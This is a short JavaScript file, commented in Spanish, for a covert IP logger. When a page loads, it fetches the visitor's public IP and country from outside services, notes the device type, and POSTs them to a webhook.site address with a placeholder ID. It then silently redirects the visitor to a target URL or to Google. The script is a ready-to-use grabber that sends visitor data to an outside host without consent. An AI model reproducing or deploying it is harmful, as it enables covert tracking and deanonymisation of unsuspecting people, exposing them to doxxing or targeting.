(async function() {
    try {
        // 1. Obtener la IP
        const ip = await (await fetch('https://api.ipify.org?format=json')).json().then(r => r.ip);
        
        // 2. Obtener País y Dispositivo
        const geo = await (await fetch(`http://ip-api.com/json/${ip}`)).json();
        const device = /mobile/i.test(navigator.userAgent) ? 'Móvil' : 'Ordenador';
        
        // 3. Preparar los datos
        const logData = `IP: ${ip} | País: ${geo.country} | Dispositivo: ${device} | Hora: ${new Date().toLocaleString()}`;
        
        // 4. ENVIAR DATOS A WEBHOOK.SITE (¡IMPORTANTE!)
        // Reemplaza 'TU_ID_UNICO' con la URL que te da webhook.site
        const webhookUrl = 'https://webhook.site/TU_ID_UNICO'; 
        await fetch(webhookUrl, { method: 'POST', body: logData });
        
        // 5. Redirigir al usuario a la URL final
        const urlParams = new URLSearchParams(window.location.search);
        const targetUrl = urlParams.get('url');
        if (targetUrl) {
            window.location.replace(targetUrl);
        } else {
            // Si no hay URL, redirigir a Google por defecto
            window.location.replace('https://www.google.com');
        }
    } catch (error) {
        console.error('Error en el logger:', error);
        // En caso de error, redirigir a Google para que no se quede colgado
        window.location.replace('https://www.google.com');
    }
})();
